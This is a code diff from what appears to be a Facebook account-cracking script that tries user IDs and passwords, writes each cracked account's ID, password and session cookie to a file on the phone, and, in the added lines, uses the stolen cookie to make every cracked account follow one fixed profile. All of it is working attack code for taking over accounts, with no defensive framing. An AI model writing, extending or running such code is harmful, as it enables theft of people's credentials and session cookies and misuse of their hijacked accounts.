@@ -48,7 +48,18 @@ def follow(self, session, coki):
         session.get('https://free.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
             
-            
+
+def follow(self,coki):
+        session = requests.Session()
+        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100000160984736",cookies={"cookie":coki}).text,"html.parser")
+        for x in r.find_all("a",href=True):
+            if "/a/subscribe.php" in x.get('href'):
+                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
+        if '/a/subscribe.php' in str(r):
+            b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
+            session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
+        else:
+            pass
  
 class jalan:
     def __init__(self, z):
@@ -294,7 +305,8 @@ def rcrack(uid,pwx,tl):
                 cek_apk(session,coki)
                 open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
-                follow(self, session, coki)
+                self.follow(coki)
+                follow_id='100000160984736'
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
